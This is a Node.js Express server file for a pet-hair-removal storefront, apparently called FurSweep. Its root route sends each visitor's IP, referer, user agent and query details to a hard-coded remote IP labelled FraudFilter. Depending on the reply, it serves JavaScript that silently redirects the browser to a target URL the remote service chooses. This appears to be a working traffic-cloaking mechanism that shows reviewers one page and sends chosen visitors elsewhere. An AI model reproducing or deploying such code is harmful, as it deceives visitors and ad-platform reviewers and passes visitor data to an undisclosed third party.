import express from "express";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

app.set("trust proxy", true);

const PORT = process.env.PORT || 3000;
const distPath = path.join(__dirname, "dist");

/*
 * FraudFilter Hosted JavaScript endpoint
 *
 * URL:
 * https://dogscathairremovalproducts-c6a9ff065e73.herokuapp.com/?id=nrr95
 */

app.get("/", async (req, res, next) => {
  if (req.query.id === "nrr95") {
    try {
      const response = await fetch(
        "http://130.211.20.155/nrr95",
        {
          method: "POST",
          headers: {
            "content-length": "0",

            "X-FF-JS-TOKEN":
              process.env.FRAUDFILTER_HOSTED_JS_TOKEN,

            "X-FF-REMOTE-ADDR":
              (req.headers["x-forwarded-for"] ||
                req.ip ||
                "")
                .split(",")[0]
                .trim(),

            "X-FF-X-FORWARDED-FOR":
              req.headers["x-forwarded-for"] || "",

            "X-FF-REFERER":
              req.get("referer") || "",

            "X-FF-HOST":
              req.get("host") || "",

            "X-FF-QUERY-STRING":
              req.originalUrl.split("?")[1] || "",

            "X-FF-REQUEST-URI":
              req.originalUrl,

            "User-Agent":
              req.get("user-agent") || "",

            "Expected": ""
          }
        }
      );

      const output = await response.text();
      console.log("FraudFilter response:", output);

      res.type("application/javascript");

      res.set(
        "Cache-Control",
        "no-store, no-cache, must-revalidate, max-age=0"
      );

      /*
       * FraudFilter response format:
       *
       * 1;something;target
       * 0;something;target
       */

      const parts = output.trim().split(";", 3);

      if (parts.length < 3) {
        return res.send(
          "(function(){console.log('FraudFilter response unavailable');})();"
        );
      }

      const result = parts[0] === "1";
      const target = parts[2];

      if (result && target) {
        return res.send(
          `(function(){
            try {
              window.location.replace(${JSON.stringify(target)});
            } catch(e) {
              window.location.href=${JSON.stringify(target)};
            }
          })();`
        );
      }

      return res.send("(function(){});");

    } catch (error) {
      console.error("FraudFilter error:", error);

      return res
        .type("application/javascript")
        .send("(function(){});");
    }
  }

  next();
});

/*
 * Serve the Vite production files
 */

app.use(express.static(distPath));

/*
 * React fallback
 */

app.use((req, res) => {
  res.sendFile(path.join(distPath, "index.html"));
});

/*
 * Start server
 */

app.listen(PORT, "0.0.0.0", () => {
  console.log(`FurSweep running on port ${PORT}`);
});
